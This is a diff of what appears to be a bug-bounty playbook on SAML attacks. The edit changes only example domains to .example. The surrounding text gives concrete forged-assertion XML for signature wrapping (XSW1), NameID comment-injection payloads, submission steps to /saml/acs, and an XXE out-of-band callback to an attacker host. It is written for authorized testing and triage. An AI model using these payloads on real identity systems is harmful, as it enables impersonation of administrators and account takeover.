@@ -14,7 +14,7 @@ SAML attacks pay top-tier bounties because a single forged assertion silently im
 
 ### Comment injection in NameID (industry class, 2018)
 - **Source:** Coordinated disclosure across SAML libraries in February 2018 — Duo Security's "Duo Finds SAML Vulnerabilities Affecting Multiple Implementations" advisory and CVE-2018-0489 (Shibboleth), CVE-2017-11427 (OneLogin python-saml), CVE-2017-11428 (OneLogin ruby-saml). Cite the class — many CVEs landed in one wave because the root cause was identical across libraries.
-- **Pattern shape:** Signature is computed over canonicalized XML which preserves text-node values across comments. The application code that later reads `NameID` uses a different DOM-walking primitive that returns only the first text node, *stopping at the comment*. So `<NameID>admin@target.com<!---->@attacker.com</NameID>` signs over the full string but the SP reads only `admin@target.com`.
+- **Pattern shape:** Signature is computed over canonicalized XML which preserves text-node values across comments. The application code that later reads `NameID` uses a different DOM-walking primitive that returns only the first text node, *stopping at the comment*. So `<NameID>admin@target.example<!---->@attacker.example</NameID>` signs over the full string but the SP reads only `admin@target.example`.
 - **Key trick:** An empty `<!---->` is enough to split the text-node stream. Fails when both signer and reader use the same canonicalization, but signer and downstream getNameID() frequently disagree.
 - **Why it matters:** Pure parser disagreement, no signature break required. Pivots to any user whose NameID prefix the attacker can craft.
 
@@ -56,22 +56,22 @@ Bounty-paid public disclosures for this class, on top of the research/CVE ground
 
 ### XSW1 — sibling injection above signature
 - **When to suspect:** SP accepts SAML responses signed by a legitimate IdP and reads NameID / AttributeStatement from the assertion. You have a valid login.
-- **Test:** Capture your own legitimate SAML response. In SAML Raider, apply "XSW1." Manually: clone the existing signed `<Assertion>`, change `NameID` to `admin@target.com` in the clone, set the clone's `ID` to a new value, insert the clone as a sibling of the original `<Assertion>` *before* the signed element. Leave the signature pointing at the original `Assertion` ID.
+- **Test:** Capture your own legitimate SAML response. In SAML Raider, apply "XSW1." Manually: clone the existing signed `<Assertion>`, change `NameID` to `admin@target.example` in the clone, set the clone's `ID` to a new value, insert the clone as a sibling of the original `<Assertion>` *before* the signed element. Leave the signature pointing at the original `Assertion` ID.
   ```xml
   <samlp:Response>
     <saml:Assertion ID="evil">
-      <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
+      <saml:Subject><saml:NameID>admin@target.example</saml:NameID></saml:Subject>
       <saml:AttributeStatement>
         <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
       </saml:AttributeStatement>
     </saml:Assertion>
     <saml:Assertion ID="legit-original">
-      <saml:Subject><saml:NameID>you@target.com</saml:NameID></saml:Subject>
+      <saml:Subject><saml:NameID>you@target.example</saml:NameID></saml:Subject>
       <ds:Signature>...covers ID=legit-original...</ds:Signature>
     </saml:Assertion>
   </samlp:Response>
   ```
-- **Validation:** Re-encode (base64 only — not base64+gzip unless the original was), URL-encode, POST to `/saml/acs`. If the SP logs you in as `admin@target.com` while the signature library reports the response as signed, XSW1 lands. Use a uniquely-marked admin test account if possible; otherwise check a NameID whose existence in the directory you can verify.
+- **Validation:** Re-encode (base64 only — not base64+gzip unless the original was), URL-encode, POST to `/saml/acs`. If the SP logs you in as `admin@target.example` while the signature library reports the response as signed, XSW1 lands. Use a uniquely-marked admin test account if possible; otherwise check a NameID whose existence in the directory you can verify.
 - **Pay-grade rationale:** Critical. ATO of any user including administrators.
 
 ### XSW2–XSW8 — variant placements
@@ -84,10 +84,10 @@ Bounty-paid public disclosures for this class, on top of the research/CVE ground
 - **When to suspect:** Library version pre-2018 patch, or a custom SAML implementation that uses `node.textContent` / `getTextContent()` to extract NameID after signature validation.
 - **Test:** Modify the NameID in your legitimate SAML response (without re-signing):
   ```xml
-  <saml:NameID>admin@target.com<!---->@attacker.com</saml:NameID>
+  <saml:NameID>admin@target.example<!---->@attacker.example</saml:NameID>
   ```
-  The signature was computed over the original NameID, but if you can re-sign with your own valid IdP keypair (because you control your own legitimate SAML flow), use comment injection inside *your own* NameID. The canonicalized form `admin@target.com@attacker.com` is what signs; the SP's reader may stop at the comment and see `admin@target.com`.
-- **Validation:** SP recognizes you as `admin@target.com`. Look at session cookie payload, `/api/me`, response headers.
+  The signature was computed over the original NameID, but if you can re-sign with your own valid IdP keypair (because you control your own legitimate SAML flow), use comment injection inside *your own* NameID. The canonicalized form `admin@target.example@attacker.example` is what signs; the SP's reader may stop at the comment and see `admin@target.example`.
+- **Validation:** SP recognizes you as `admin@target.example`. Look at session cookie payload, `/api/me`, response headers.
 - **Pay-grade rationale:** Critical when reachable. ATO of any user whose NameID local-part you can craft.
 
 ### Signature stripping — no signature accepted
@@ -150,7 +150,7 @@ Bounty-paid public disclosures for this class, on top of the research/CVE ground
     </saml:Assertion>
   </samlp:Response>
   ```
-- **Validation:** SP error message reflects file contents, or out-of-band callback fires for `http://collaborator.attacker.com/x`.
+- **Validation:** SP error message reflects file contents, or out-of-band callback fires for `http://collaborator.attacker.example/x`.
 - **Pay-grade rationale:** High when file read; critical when blind SSRF or RCE chains.
 
 ### Pre-account-takeover via SAML JIT provisioning
@@ -175,14 +175,14 @@ Bounty-paid public disclosures for this class, on top of the research/CVE ground
 - **How to disprove:** Take a legitimate response, change *one byte* in the assertion body without re-signing, submit. If accepted, the signature isn't actually verified. If rejected, the verifier is running — pursue XSW variants instead. Cite the specific bytes you changed in the report.
 
 ### XSW "succeeds" but you logged in as yourself
-- **Looks like:** You apply XSW1 with NameID `admin@target.com`, submit, and reach a logged-in dashboard. Looks like ATO of admin.
+- **Looks like:** You apply XSW1 with NameID `admin@target.example`, submit, and reach a logged-in dashboard. Looks like ATO of admin.
 - **Actually is:** Several SP libraries find the *signed* Assertion (your original) and extract NameID from there. The forged Assertion is parsed but ignored. You logged in as yourself — XSW didn't land.
 - **How to disprove:** Check `/api/me`, the session cookie payload, audit logs, or any UI element that displays the current username. If it shows your own account, no XSW. Try the other XSW variants — different libraries pick different Assertions. Confirm with a uniquely-marked admin test account whose NameID local-part doesn't collide with your own.
 
 ### Comment injection that doesn't survive canonicalization
 - **Looks like:** You injected `<!---->` in NameID and the response was accepted. You suspect the SP read the truncated form.
 - **Actually is:** Some libraries call `c14n` (canonicalization) before passing the parsed value to application logic — the comment is normalized away identically by both the signer and the reader. The accept doesn't prove the comment exploit; the SP might just be reading the full NameID.
-- **How to disprove:** Inspect the actual session — what NameID did the SP store? If it stored the full `admin@target.com@attacker.com`, comment injection didn't bypass the reader. If it stored `admin@target.com`, the reader stopped at the comment. The session/audit-log inspection is the only ground truth.
+- **How to disprove:** Inspect the actual session — what NameID did the SP store? If it stored the full `admin@target.example@attacker.example`, comment injection didn't bypass the reader. If it stored `admin@target.example`, the reader stopped at the comment. The session/audit-log inspection is the only ground truth.
 
 ### SAML response returns HTTP 400 — assumed signature rejection
 - **Looks like:** You posted a forged response, got HTTP 400, and assumed the SP rejected the signature.
